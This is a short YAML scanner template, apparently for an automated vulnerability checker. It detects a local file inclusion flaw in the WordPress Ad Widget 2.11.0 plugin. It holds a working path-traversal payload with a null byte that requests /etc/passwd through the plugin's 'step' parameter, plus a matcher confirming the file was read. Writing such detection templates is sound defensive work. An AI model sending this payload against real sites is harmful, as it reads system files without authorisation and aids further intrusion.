id: ad-widget-lfi
name: WordPress Ad Widget 2.11.0 - Local File Inclusion
severity: high
confidence: tentative
description: WordPress Ad Widget 2.11.0 is vulnerable to local file inclusion. Exploiting this issue may allow an attacker
  to obtain sensitive information that could aid in further attacks.
reference: CWE-22
tags:
- wordpress
- wp-plugin
- lfi
- wp
- adWidget
- wpscan
- vuln
requests:
- method: GET
  path: /wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
